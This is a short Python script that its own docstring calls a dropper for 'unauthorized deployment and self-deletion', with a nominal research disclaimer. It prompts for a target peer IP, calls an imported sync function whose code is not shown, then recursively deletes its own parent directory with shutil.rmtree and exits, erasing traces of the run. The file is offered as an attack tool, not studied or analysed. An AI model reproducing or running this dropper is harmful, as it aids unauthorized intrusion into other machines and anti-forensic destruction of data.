"""DISCLAIMER: This dropper facilitates unauthorized deployment and
self-deletion. It is provided solely for research purposes."""

import os
import time
import shutil
import sys
from net.secure_peer_client import secure_sync_with_peer

def drop_node(peer_ip):
    try:
        print(f"[↯] Drop-node syncing to {peer_ip} ...")
        secure_sync_with_peer(peer_ip)
        print("[✓] Sync complete. Initiating self-wipe...")
    except Exception as e:
        print(f"[!] Sync failed: {e}")
    finally:
        time.sleep(1)
        wipe_self()

def wipe_self():
    cwd = os.path.dirname(os.path.abspath(__file__))
    parent = os.path.abspath(os.path.join(cwd, ".."))
    try:
        shutil.rmtree(parent)
        print("[☠] Drop-node deleted successfully.")
    except Exception as e:
        print(f"[!] Self-deletion failed: {e}")
    sys.exit()

if __name__ == "__main__":
    target = input("Target Peer IP: ")
    drop_node(target)
